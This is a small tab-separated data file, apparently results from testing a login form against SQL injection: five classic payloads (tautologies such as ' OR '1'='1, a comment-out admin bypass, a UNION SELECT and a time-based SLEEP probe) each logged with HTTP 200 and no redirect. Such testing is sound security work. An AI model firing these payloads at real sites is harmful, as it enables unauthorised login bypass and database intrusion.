payload	http_status	redirect_to_index
' OR '1'='1	HTTP/1.1 200 OK	NO
admin' --	HTTP/1.1 200 OK	NO
" OR "1"="1	HTTP/1.1 200 OK	NO
' UNION SELECT 1,2,3 --	HTTP/1.1 200 OK	NO
' OR SLEEP(1) --	HTTP/1.1 200 OK	NO
